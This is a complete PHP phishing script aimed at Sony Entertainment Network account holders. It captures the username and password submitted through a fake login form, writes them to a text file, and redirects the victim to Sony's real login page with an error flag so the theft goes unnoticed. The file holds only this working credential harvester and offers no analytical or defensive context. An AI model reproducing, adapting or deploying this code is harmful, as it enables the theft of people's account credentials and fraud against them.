<?PHP
$Log = $_POST['login'];
$Pass = $_POST['pass'];
$log = fopen("database.txt","at");
fwrite($log,"$Log:$Pass\n");
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://auth.api.sonyentertainmentnetwork.com/login.jsp?request_theme=liquid&authentication_error=true'></head></html>";
?>